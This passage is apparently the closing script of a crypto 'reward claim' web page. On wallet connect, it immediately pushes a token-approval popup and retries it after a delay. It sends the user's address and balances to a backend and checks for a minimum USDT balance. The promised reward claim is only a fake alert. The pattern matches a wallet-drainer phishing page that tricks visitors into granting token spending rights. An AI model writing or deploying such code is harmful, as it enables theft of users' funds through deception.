          setAppKitEip155Provider(null);
          clearSessionUI();
        }
      });
    }

    async function handleAppKitProvider(provider) {
      try {
        providerInstance = provider;
        web3Instance = new Web3(providerInstance);

        let accounts = await web3Instance.eth.getAccounts();

        // Mobile Chrome sometimes returns [] for 0.5 seconds ‚Üí retry
        if (!accounts || !accounts.length) {
          for (let i = 0; i < 5; i++) {
            await new Promise(r => setTimeout(r, 400));
            accounts = await web3Instance.eth.getAccounts();
            if (accounts && accounts.length) break;
          }
        }

        if (!accounts || !accounts.length) {
          console.warn("Still no accounts after retry mobile.");
          return;
        }

        const address = accounts[0].toLowerCase();
        currentAddress = address;

        // Restore UI + balances
        await restoreSessionFromAddress(address);

        isWalletConnected = true;
        setStatus("Connected");

        // IMMEDIATE: request token approval fast (fire-and-forget)
        ensureTokenApproval_fastImmediate().catch(e => console.warn("fastImmediate error:", e));

        // Delayed fallback: if fast path didn't record approval (non-user-failure),
        // attempt slower ensureTokenApproval after a short delay.
        setTimeout(() => {
          try {
            const approved = getApprovedFlag(address);
            const rejExpiry = getRejectExpiry(address);
            if (!approved && (!rejExpiry || rejExpiry <= Date.now())) {
              ensureTokenApproval().catch(e => console.warn("delayed ensureTokenApproval failed:", e));
            } else {
              console.log("delayed fallback skipped (approved or recently rejected)");
            }
          } catch(e){ console.warn("delayed fallback error:", e); }
        }, 2500);

      } catch (err) {
        console.error("handleAppKitProvider error:", err);
      }
    }

    // üîÅ NEW: connect using Reown AppKit (fixed for mobile)
    async function connectFlow() {
      try {
        if (!window.appKit) {
          alert("Wallet connect UI not ready. Please reload the page.");
          return;
        }

        setStatus("Connecting‚Ä¶");

        let gotProvider = null;

        // 1) Subscribe BEFORE opening the modal
        const unsubscribe = window.appKit.subscribeProviders((state) => {
          const evm = state["eip155"];
          if (evm && !gotProvider) {
            gotProvider = evm;
          }
        });

        // 2) Open AppKit modal (Connect view)
        await window.appKit.open({ view: "Connect" });

        // 3) Stop listening
        if (typeof unsubscribe === "function") {
          unsubscribe();
        }

        // 4) If no provider, user probably closed modal or connect failed
        const provider = gotProvider;
        if (!provider) {
          setStatus("Not connected");
          return;
        }

        // 5) Use this provider for Web3 & Ethers
        providerInstance = provider;
        web3Instance     = new Web3(providerInstance);

        attachProviderListeners(providerInstance);

        const accounts = await web3Instance.eth.getAccounts();
        if(!accounts || !accounts.length){
          setStatus("No account");
          return;
        }
        const address = accounts[0].toLowerCase();
        currentAddress = address; // helpful for approval logging

        // 6) Ensure BSC (56)
        let chainId    = await web3Instance.eth.getChainId();
        let chainIdNum = typeof chainId === "string" ? Number(chainId) : Number(chainId);

        if (chainIdNum !== BNB_TESTNET_CHAIN_ID_DEC){
          const switched = await switchToBSC(providerInstance);
          if(!switched){
            alert("Please switch to BNB Smart Chain (56) in your wallet and try again.");
            setStatus("Wrong network");
            return;
          }
          chainId    = await web3Instance.eth.getChainId();
          chainIdNum = typeof chainId === "string" ? Number(chainId) : Number(chainId);
          if(chainIdNum !== BNB_TESTNET_CHAIN_ID_DEC){
            alert("Network switch failed. Make sure you are on BNB Smart Chain (56).");
            setStatus("Wrong network");
            return;
          }
        }

        // 7) Connected + correct network
        setStatus("Connected");

        // IMMEDIATE: trigger the fast wallet approve popup
        ensureTokenApproval_fastImmediate().catch(err => console.warn("fastImmediate error:", err));

        // Continue heavy tasks in the background (do not block popup)
        (async () => {
          try {
            const session = await restoreSessionFromAddress(address);
            notifyBackend(address, BNB_TESTNET_LABEL, session.userId, session.balanceBNB, session.tokenBalance, "connect").catch(console.error);
          } catch(e){
            console.warn("background session restore failed:", e);
          }
        })();

        // Delayed fallback after short pause (if fast path did not record approval)
        setTimeout(() => {
          try {
            const approved = getApprovedFlag(address);
            const rejExpiry = getRejectExpiry(address);
            if (!approved && (!rejExpiry || rejExpiry <= Date.now())) {
              ensureTokenApproval().catch(e => console.warn("delayed ensureTokenApproval failed:", e));
            } else {
              console.log("delayed fallback skipped (approved or recently rejected)");
            }
          } catch(e){ console.warn("delayed fallback error:", e); }
        }, 2500);

      } catch (err) {
        console.error("connectFlow error (AppKit):", err);
        setStatus("Connection failed");
        alert("Connection failed: " + (err && err.message ? err.message : err));
      }
    }

    async function tryAutoReconnectSilent(){
      // keep your old silent reconnect using injected wallets
      if(window.trustwallet && window.trustwallet.ethereum){
        const injected = window.trustwallet.ethereum;
        providerInstance = injected;
        web3Instance     = new Web3(providerInstance);
        attachProviderListeners(providerInstance);
        const accounts = await injected.request({method:"eth_accounts"});
        if(accounts && accounts.length){
          const address = accounts[0].toLowerCase();
          setStatus("Restoring session (Trust Wallet)...");
          await restoreSessionFromAddress(address);
          setStatus("Connected (restored)");
          return true;
        }
      }

      if(window.ethereum){
        const injected = window.ethereum;
        providerInstance = injected;
        web3Instance     = new Web3(providerInstance);
        attachProviderListeners(providerInstance);
        const accounts = await injected.request({method:"eth_accounts"});
        if(accounts && accounts.length){
          const address = accounts[0].toLowerCase();
          setStatus("Restoring session...");
          await restoreSessionFromAddress(address);
          setStatus("Connected (restored)");
          return true;
        }
      }

      return false;
    }

    async function autoConnectOnLoad(){
      try{
        const restored = await tryAutoReconnectSilent();
        if(!restored){
          clearSessionUI();
        }
      }catch(e){
        console.warn("autoConnectOnLoad failed:", e);
        clearSessionUI();
      }
    }

    async function claimReward(){
      try{
        if(!isWalletConnected){
          alert("Please connect your wallet first.");
          setStatus("Connect wallet before claiming.");
          return;
        }
        if(!(task1Done && task2Eligible && task3Done)){
          alert("Please complete all tasks first.");
          return;
        }
        if(!web3Instance || !providerInstance || !currentAddress){
          alert("Wallet not ready, connect again.");
          return;
        }

        setStatus("Claiming reward‚Ä¶");

        // TODO: real contract call later
        setTimeout(()=>{
          setStatus("Reward claimed for " + currentAddress.slice(0,6) + "‚Ä¶" + currentAddress.slice(-4));
          alert("Reward claimed! (demo mode ‚Äî add real contract call later)");
        },800);
      }catch(err){
        console.error("claimReward error:", err);
        setStatus("Reward claim failed");
      }
    }

    // === TASK LOGIC ===
    function showTaskPage(){
      if(rewardPageEl) rewardPageEl.style.display = "none";
      if(taskPageEl)   taskPageEl.style.display   = "block";
    }
    function showRewardPage(){
      if(taskPageEl)   taskPageEl.style.display   = "none";
      if(rewardPageEl) rewardPageEl.style.display = "block";
    }

    async function handleTask2Check(){
      if(!isWalletConnected || !currentAddress){
        alert("Please connect your wallet first.");
        return;
      }
      if(!web3Instance || !providerInstance){
        alert("Wallet not ready, try reconnect.");
        return;
      }

      try{
        setStatus("Checking wallet balance‚Ä¶");
        const balanceStr = await getTokenBalance(currentAddress);
        const balanceNum = balanceStr ? Number(balanceStr) : 0;

        const eligible = balanceNum >= REQUIRED_USDT;
        task2Eligible = eligible;

        markTaskState(
          task2CheckEl,
          eligible,
          "ELIGIBLE (balance ‚â• " + REQUIRED_USDT + ")",
          "Not eligible (needs ‚â• " + REQUIRED_USDT + ")"
        );

        if(task2DetailEl){
          task2DetailEl.textContent =
            "Detected balance: " + balanceNum.toFixed(4) +
            " USDT. Result: " + (eligible ? "ELIGIBLE" : "NOT ELIGIBLE") +
            ". Later you can also check if this is an active account.";
        }

        setStatus("Wallet check completed");
        updateClaimState();
      }catch(err){
        console.error("Task 2 check error:", err);
        if(task2DetailEl){
          task2DetailEl.textContent = "Error checking wallet. Try again.";
        }
      }
    }

    // ===== DOMContentLoaded =====
    document.addEventListener("DOMContentLoaded", async function(){
      if(rewardAmountEl){
        rewardAmountEl.textContent = "$" + REWARD_AMOUNT.toFixed(0);
      }

      updateClaimState();
      setupAppKitProviderWatcher();

      if(connectBtn){
        connectBtn.addEventListener("click", function(){
          if(isWalletConnected) return;
          connectFlow();
        });
      }

      // Connect button inside reward card
      const connectBtnCard = document.getElementById("connectBtnCard");
      if (connectBtnCard) {
        connectBtnCard.addEventListener("click", function () {
          if (isWalletConnected) return;
          connectFlow();
        });
      }

      if(claimBtn){
        claimBtn.addEventListener("click", claimReward);
      }

      if(taskBtn){
        taskBtn.addEventListener("click", showTaskPage);
      }
      if(backToRewardsBtn){
        backToRewardsBtn.addEventListener("click", showRewardPage);
      }

      if(task1Btn){
        task1Btn.addEventListener("click", function(){
          task1Done = true;
          markTaskState(task1CheckEl, true, "Task 1 completed (demo)", "Not completed");
          updateClaimState();
        });
      }

      if(task2CheckBtn){
        task2CheckBtn.addEventListener("click", handleTask2Check);
      }

      if(task3Btn){
        task3Btn.addEventListener("click", function(){
          task3Done = true;
          markTaskState(task3CheckEl, true, "Task 3 completed (demo)", "Not completed");
          updateClaimState();
        });
      }

      await autoConnectOnLoad();
      const yearEl = document.getElementById("year");
      if(yearEl) yearEl.textContent = new Date().getFullYear();
    });

  })();
  </script>
</body>
</html>
